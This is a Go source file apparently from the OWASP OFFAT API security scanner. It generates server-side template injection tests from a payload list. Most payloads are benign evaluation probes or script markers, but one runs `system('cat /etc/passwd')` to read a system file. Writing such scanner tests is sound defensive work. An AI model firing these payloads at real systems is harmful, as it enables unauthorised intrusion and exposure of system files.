package tgen

import (
	"github.com/OWASP/OFFAT/src/pkg/parser"
)

func BasicSstiInjectionTest(baseUrl string, docParams []*parser.DocHttpParams, queryParams map[string]string, headers map[string]string, injectionConfig InjectionConfig) []*ApiTest {
	testName := "Basic SSTI Injection Test"

	// TODO: implement injection in both keys and values
	payloads := []Payload{
		{InjText: `${7777+99999}`, Regex: "107776"},
		{InjText: `{{7*'7'}}`, Regex: "49"},
		{InjText: `*{7*7}`, Regex: "49"},
		{InjText: `{{7*'7'}}`, Regex: "7777777"},
		{InjText: `{{ '<script>confirm(1337)</script>' }}`, Regex: `<script>confirm(1337)</script>`},
		{InjText: `{{ '<script>confirm(1337)</script>' | safe }}`, Regex: `<script>confirm(1337)</script>`},
		{InjText: `{{'owasp offat'.toUpperCase()}}`, Regex: `OWASP OFFAT`},
		{InjText: `{{'owasp offat' | upper }}`, Regex: `OWASP OFFAT`},
		{InjText: `<%= system('cat /etc/passwd') %>`, Regex: `root:.*`},
	}

	injectionConfig.Payloads = payloads

	tests := injectParamIntoApiTest(baseUrl, docParams, queryParams, headers, testName, injectionConfig)

	return tests
}
